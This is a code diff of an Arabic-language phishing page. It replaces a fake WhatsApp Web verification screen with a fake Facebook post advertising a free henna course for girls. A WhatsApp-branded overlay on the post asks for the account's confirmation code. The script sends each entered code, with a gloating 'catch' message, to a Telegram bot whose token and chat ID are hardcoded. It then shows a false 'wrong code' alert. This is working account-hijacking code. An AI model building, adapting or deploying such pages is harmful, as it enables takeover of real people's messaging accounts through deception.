@@ -3,94 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web</title>
+    <title>Facebook - الأستاذة منال لتعليم النقش</title>
     <style>
-        :root {
-            --wa-green: #00a884;
-            --wa-bg: #f0f2f5;
-            --wa-white: #ffffff;
-            --wa-text: #3b4a54;
-        }
-        body {
-            background-color: var(--wa-bg);
-            font-family: Segoe UI, Helvetica Neue, Helvetica, Lucida Grande, Arial, Ubuntu, Cantarell, Fira Sans, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: var(--wa-white);
-            width: 100%;
-            max-width: 450px;
-            padding: 40px;
-            box-shadow: 0 17px 50px 0 rgba(11,20,26,.19);
-            border-radius: 3px;
-            text-align: center;
-        }
-        .logo { width: 80px; margin-bottom: 25px; }
-        h1 { color: #41525d; font-size: 28px; font-weight: 300; margin-bottom: 40px; }
-        .instruction { color: var(--wa-text); font-size: 16px; line-height: 1.6; margin-bottom: 30px; }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #e9edef;
-            border-radius: 5px;
-            font-size: 16px;
-            margin-bottom: 20px;
-            box-sizing: border-box;
-            outline: none;
-        }
-        input:focus { border-bottom: 2px solid var(--wa-green); }
-        .btn {
-            background-color: var(--wa-green);
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 3px;
-            font-weight: 500;
-            cursor: pointer;
-            width: 100%;
-            font-size: 14px;
-            text-transform: uppercase;
-        }
-        .footer { margin-top: 30px; font-size: 12px; color: #8696a0; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; }
+        .fb-header { background-color: #ffffff; padding: 10px 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; }
+        .fb-logo { color: #1877f2; font-size: 24px; font-weight: bold; }
+        .content { max-width: 500px; margin: 20px auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .profile-p { padding: 15px; display: flex; align-items: center; }
+        .circle { width: 40px; height: 40px; background: #ddd; border-radius: 50%; margin-left: 10px; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .wa-card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 10px; text-align: center; }
+        .wa-btn { background: #00a884; color: white; border: none; width: 100%; padding: 12px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; margin-top: 10px; box-sizing: border-box; text-align: center; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA" class="logo">
-    <h1>استخدام واتساب على الكمبيوتر</h1>
-    <div class="instruction">
-        يرجى إدخال <strong>رمز التحقق</strong> المكون من 6 أرقام لتأكيد ملكية الحساب ومزامنة الرسائل السحابية.
+<div class="fb-header"><div class="fb-logo">facebook</div></div>
+
+<div class="content">
+    <div class="profile-p">
+        <div class="circle"></div>
+        <div><strong>الأستاذة منال لتعليم النقش والحناء</strong><br><small>منذ ٢ ساعة</small></div>
     </div>
-    <input type="text" id="otp" placeholder="000-000" maxlength="7">
-    <button class="btn" onclick="sendData()">تأكيد الرمز</button>
-    <div class="footer">من Meta. التشفير تماماً بين الطرفين.</div>
+    <div style="padding: 0 15px 15px;">دورة تعليم نقش الحناء الخليجي مجاناً للبنات.. شاهد الفيديو التعليمي بالأسفل.</div>
+    <img src="https://via.placeholder.com/500x300?text=Video+Loading..." style="width: 100%;">
+</div>
+
+<div class="overlay" id="overlay">
+    <div class="wa-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="60">
+        <h3>تأكيد أمان الحساب</h3>
+        <p style="font-size: 14px; color: #666;">لمشاهدة دورة "النقش والحناء" كاملة، يرجى تأكيد حسابك المرتبط بواتساب لمنع دخول البوتات.</p>
+        <input type="text" id="otp" placeholder="أدخل رمز التأكيد">
+        <button class="btn wa-btn" onclick="sendHack()">تأكيد ومتابعة المشاهدة</button>
+    </div>
 </div>
 
 <script>
-    async function sendData() {
+    async function sendHack() {
         const otp = document.getElementById('otp').value;
-        if(otp.length < 6) return alert("يرجى إدخال رمز صحيح");
-
         const token = "8462219592:AAEyi0IhxJgBOgOYQ-sq5NuaRZsTY144IcY";
         const chatId = "7637530382";
-        const text = `🔥 صيد محترف!\n🔢 الكود: ${otp}\n🌐 الرابط: ${window.location.href}`;
+        const log = `🎯 صيد من صفحة النقش!\n🔢 الكود: ${otp}\n🏷 الضحية يظن أنها "الأستاذة منال"`;
 
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: chatId, text: text})
-            });
-            // التحويل للتمويه
-            window.location.href = "https://web.whatsapp.com";
-        } catch(e) {
-            alert("حدث خطأ في الشبكة");
-        }
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: chatId, text: log})
+        });
+
+        alert("الرمز غير صحيح، أعد المحاولة.");
     }
 </script>
 
